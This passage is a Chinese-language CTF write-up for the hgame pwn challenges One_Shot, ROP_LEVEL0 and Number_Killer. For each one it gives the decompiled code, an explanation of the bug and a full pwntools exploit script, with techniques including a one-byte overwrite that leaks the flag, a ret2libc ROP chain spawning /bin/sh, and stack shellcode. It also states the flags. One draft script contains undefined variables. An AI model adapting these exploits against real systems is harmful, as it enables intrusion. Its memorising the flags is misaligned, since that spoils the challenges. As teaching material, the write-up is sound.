      *(_QWORD *)fd = open("./flag", 0, envp);
      setbuf(stdout, 0LL);
      read(fd[0], &flag, 30uLL);
      puts("Firstly....What's your name?");
      __isoc99_scanf("%32s", &name);
      puts("The thing that could change the world might be a Byte!");
      puts("Take tne only one shot!");
      __isoc99_scanf("%d", &v4);
      *v4 = 1;
      puts("A success?");
      printf("Goodbye,%s", &name);
      return 0;
    }
这里的话 我们 可以知道 该程序读取了 flag 存在在 bss段中，同时name  
也存在了栈中，并且它们 相邻， 如果我们把name最后的 结束符\x00 给 换成 1 的话
那么，输出 name将会 顺带着把flag给输出 出来，所以这里 我们 首先输入32
字节大小填满 name，然后将 flag所在bss段中地址 0x6010E0 以十进制即6295776 发送即可实现！
所以 exp：
    #coding:utf-8
    from pwn import *
    context.log_level='debug'
    io = process("./One_Shot")
    io = remote('47.103.214.163',20002)
    io.recvuntil("Firstly....What's your name?")
    payload = 'a'*32
    io.sendline(payload)    
    io.recvuntil("Take tne only one shot!")
    payload2="6295776"
    #gdb.attach(io)
    #pause()    
    io.send(payload2)
    io.interactive()
得到 flag：hgame{On3_Sh0t_0ne_Fl4g}
# 0x07：ROP_LEVEL0
我们把它 拖入 ida 发现 其实 源码还是很简单的  
我们把我们文件./some_life_experience的 内容 输出，然后我们再最多read 到buf 0x100字节！
这里的漏洞在 最后的read (0,&buf,0x100),存在栈溢出漏洞！
这题没有 system 和/bin/sh 字符后，所以 我这里 是 利用 puts 函数泄露libc
然后最后使用libc中的 system 和 /bin/sh 字符 getshell。
Exp：
    #coding:utf-8
    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    io = process("./ROP_LEVEL0")
    elf=ELF("./ROP_LEVEL0")
    #io = remote('47.103.214.163',20002)
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    libc_start_main_got = elf.got['__libc_start_main'] # 载入的libc_main函数的地址。
    main_addr = elf.symbols['main']
    pop_rdi_addr=0x400753
    print hex(puts_plt)
    print hex(puts_got) #0x601018
    print hex(libc_start_main_got)
    print hex(main_addr)    #0x40065b
    print hex(pop_rdi_addr) #0x400753               #ROPgadget --binary ROP_LEVEL0 --only 'pop|ret'
    payload='a'*(0x50+8)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    io.sendlineafter("You can not only cat flag but also Opxx Rexx Wrxxx ./flag",payload)
    io.recv()
    puts_addr=u64(io.recv(6).ljust(8,"\x00"))
    print hex(puts_addr)
    libc = LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    binsh_addr = libc_base + libc.dump('str_bin_sh')
    p.sendlineafter('You can not only cat flag but also Opxx Rexx Wrxxx ./flag','a'*(0x50+8)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr))
    io.interactive()
从而得到：  
经过尝试 确定 libc6_2.23-0ubuntu10_amd64 符合 要求：  
我们在 这个网站上 可查到 libc中的 每个函数的 偏移地址：  
于是最后的 exp：
    #coding:utf-8
    from pwn import *
    from LibcSearcher import LibcSearcher
    context.log_level='debug'
    io = process("./ROP_LEVEL0")
    elf=ELF("./ROP_LEVEL0")
    libc=ELF("./libc6_2.23-0ubuntu10_amd64.so")
    io = remote('47.103.214.163',20003)
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    libc_start_main_got = elf.got['__libc_start_main'] # 载入的libc_main函数的地址。
    main_addr = elf.symbols['main']
    pop_rdi_addr=0x400753
    print hex(puts_plt)
    print hex(puts_got) #0x601018
    print hex(libc_start_main_got)
    print hex(main_addr)    #0x40065b
    print hex(pop_rdi_addr) #0x400753   #ROPgadget --binary ROP_LEVEL0 --only 'pop|ret'
    payload='a'*(0x50+8)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    io.sendlineafter("You can not only cat flag but also Opxx Rexx Wrxxx ./flag",payload)
    io.recv()
    puts_addr=u64(io.recv(6).ljust(8,"\x00"))
    print hex(puts_addr)
    #libc = LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - 0x06f690#libc.symbols['puts']
    system_addr = libc_base + 0x045390#libc.symbols('system')
    libc_binsh=next(libc.search("/bin/sh"))
    binsh_addr = libc_base + libc_binsh
    io.sendlineafter('You can not only cat flag but also Opxx Rexx Wrxxx ./flag','a'*(0x50+8)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr))
    io.interactive()
得到 flag：
    hgame{R0P_1s_H4cK3rs'_RoM4nC3}
# 0x08：Number_Killer
最后一道 pwn：  
直接 丢ida 里，  
我们可以看到 我们循环调用 20 次 readll 函数  
我们 进入 readll 看下：  
我们可以理解为这个函数 它将我们输入的 8个字符类型的数据 转化 成 long long int数据了，
这个 atoll函数 可具体参考这里：  
功能：解析C字符串str，将其内容解释为整数，并将其作为type的值返回long long int。  
；另外 我们 注意看 main 函数 v4数组 在栈中 据 rbp的距离 为 0x60  
然后除此之外还要注意 在 rbp-0x4 处还有个i ，在当我们覆盖的时候要不能影响它，因为这个i 会被其他地方调用 ，导致
一些奇怪的事情，最后的进行rop的话还要注意 atoll函数 返回类型 是long long int。最大范围是 0x7fffffff ffffffff
最后的shellcode 要用 nop 调整下，不然 会返回 负 1 影响shellcode 功能！
于是 exp：
    from pwn import *
    p = process("./Number_Killer")
    #p = remote('47.103.214.163',20001)
    context.log_level = 'info'
    context.arch ='amd64'
    p.recvuntil("Let's Pwn me with numbers!\n")
    def sendNumber(num):
        p.sendline(str(num))
        sleep(0.1)
    for i in range(11):
        sendNumber(1)
    sendNumber(0xc00000000)         #idx
    #gdb.attach(p)
    #pause()
    sendNumber(0x00000000040078d)   #ret_addr
    shellcode =  "\x90\x90\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";                                     
    shellcode = shellcode.ljust(0x30,'\x00')
    print(len(shellcode))
    for i in range(6):
        sh = shellcode[8*i:8*i+8]
        num = u64(sh)
        print(hex(num))
        sendNumber(num)
    p.interactive()
得到 flag：
    hgame{Ea2y_2hel1c0de_1n_St4ck}
# 0x09：特殊时期，出门记得戴口罩哦！